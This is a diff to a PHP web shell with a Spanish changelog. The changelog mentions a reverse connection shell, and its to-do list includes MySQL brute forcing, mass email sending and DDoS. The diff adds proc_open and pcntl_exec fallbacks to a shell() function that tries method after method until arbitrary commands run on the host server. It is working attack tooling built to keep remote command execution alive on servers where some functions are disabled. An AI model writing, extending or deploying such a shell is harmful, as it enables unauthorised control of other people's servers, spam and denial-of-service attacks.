@@ -49,6 +49,8 @@
     [+] Agregada shell de conexion inversa
     [+] Agregados los links del menu en una linea abajo
     [+] Muestra el tamaño de los archivos en el navegador
+    [+] La función shell() usa proc_open() y pcntl_exec()
+
     
    ToDo:
    [!] Eliminar los mensajes de: "No se puede leer /var/log/messages porque supera los 50000 bytes", o ponerlos como link
@@ -62,7 +64,6 @@
    [+] Agregar brute force de mysql
    [+] Agregar navegador de sql
    [+] Agregar para mover y copiar los archivos
-   [+] Ejecutar comandos con http://us3.php.net/manual/en/function.pcntl-exec.php y http://ar2.php.net/manual/en/function.proc-open.php
    [+] Agregar para copiar y mover archivos
    [+] Enviar muchos emails de un saque
    [+] DDoS ?
@@ -1389,6 +1390,10 @@ function shell($cmd, $array = true){
         
         elseif (passthrureturn("echo a")){$salida[]=passthrureturn($cmd); $salida[]='Modo: passthru($cmd)';}
        
+        elseif (shellprocopen("echo a")){$salida[]=shellprocopen($cmd); $salida[]='Modo: proc_open($cmd)';}
+       
+        elseif (shellpcntl("echo a")){$salida[]=shellpcntl($cmd); $salida[]='Modo: pcntl_exec($cmd)';}
+        
         if ($array){
             return $salida;
         }else{
@@ -1427,6 +1432,39 @@ function passthrureturn($cmd){
         $salida = ob_get_clean();
     ob_end_clean();
     return $salida;
+}
+function shellprocopen($cmd){
+    $descriptorspec = array(
+       0 => array("pipe", "r"), 
+       1 => array("pipe", "w"), 
+       2 => array("pipe", "w") 
+    );
+   
+    $process = proc_open($cmd, $descriptorspec, $pipes);
+    
+    if (is_resource($process)) {    
+        fclose($pipes[0]);
+        $salida = stream_get_contents($pipes[1]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        $return_value = proc_close($process);
+        return $salida;
+    }else{
+        return false;
+    }
+}
+function shellpcntl($cmd){
+    if(!function_exists('pcntl_exec')){
+        return false;
+    }
+    $args = explode(' ',$cmd);
+    $path = $args[0];
+    unset($args[0]);
+    if(pcntl_exec($path,$args)===false){
+        return false;
+    }else{
+        return 'El comando fue ejecutado, pero no se pudo recuperar la salida';
+    }
 }
 
 //muestra los archivos del manejador de archivos
